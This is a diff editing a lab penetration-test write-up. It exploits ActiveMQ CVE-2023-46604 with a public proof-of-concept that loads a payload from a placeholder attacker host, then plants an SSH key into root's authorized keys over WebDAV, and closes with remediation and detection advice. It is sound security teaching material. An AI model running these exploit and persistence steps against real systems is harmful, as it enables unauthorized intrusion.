@@ -68,15 +68,15 @@ Truncated scan output:
 61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15
 ```
 
-Significance: the exposed ActiveMQ surface defines the attack path — management HTTP on 8161, STOMP on 61613, and OpenWire on 61616. The reported broker version, 5.15.15, falls in the range affected by CVE-2023-46604.
+Significance: the exposed ActiveMQ surface defines the attack path: management HTTP on 8161, STOMP on 61613, and OpenWire on 61616. The broker version the scan reported, 5.15.15, falls in the range affected by CVE-2023-46604.
 
 Result: SSH, HTTP, and multiple broker protocols are reachable, and ActiveMQ 5.15.15 is exposed on the OpenWire transport.
 
 ### 2. ActiveMQ OpenWire Exploitation (CVE-2023-46604)
 
-Observation: ActiveMQ 5.15.15 is affected by CVE-2023-46604, an unauthenticated remote code execution flaw in the OpenWire marshaller that lets a client cause the broker to instantiate attacker-controlled Spring XML. The source records that the management console on 8161 also accepted default credentials; the console was not required for the exploit.
+Observation: ActiveMQ 5.15.15 is affected by CVE-2023-46604, an unauthenticated remote code execution flaw in the OpenWire marshaller that lets a client cause the broker to instantiate attacker-controlled Spring XML. I expected the reported build to be exploitable; the management console on 8161 also accepted default credentials, though the console was not required for the exploit.
 
-Action: a public CVE-2023-46604 OpenWire proof-of-concept was pointed at the target with an attacker-hosted XML payload.
+Action: I tried a public CVE-2023-46604 OpenWire proof-of-concept against the target with an attacker-hosted XML payload.
 
 ```bash
 python3 exploit.py -i <TARGET_IP> -p 61616 -u http://<ATTACKER_HOST>/<PAYLOAD_XML>
@@ -135,7 +135,7 @@ http {
 }
 ```
 
-An SSH key was generated and its public half written into root's authorized keys over the WebDAV endpoint:
+I generated an SSH key and wrote its public half into root's authorized keys over the WebDAV endpoint:
 
 ```bash
 ssh-keygen -t ed25519 -f <KEY_NAME> -N ""
@@ -170,7 +170,7 @@ The evidence establishes unauthenticated code execution as the ActiveMQ service 
 
 ## Recommendations: OpenWire, console defaults, sudo, and WebDAV
 
-Each finding pairs the observed root cause with its demonstrated impact and a prioritized action. The actions below are recommendations; they were not tested in the lab.
+The actions below are recommendations; they were not tested in the lab.
 
 1. **Unauthenticated vulnerable OpenWire transport.** CVE-2023-46604 is an unauthenticated code-execution flaw in the OpenWire marshaller, and it is reachable whenever port 61616 is exposed; exploitation yielded service-account code execution. *Recommendation:* upgrade or patch ActiveMQ and restrict 61616 to trusted networks, disabling OpenWire where it is not required. *Detection:* monitor the broker for unexpected class instantiation and unusual outbound connections initiated from the service account.
 2. **Default management console credentials.** The console accepted default credentials, granting authenticated management access independent of the exploit path. *Recommendation:* change default credentials and restrict the management interface to trusted administration networks.
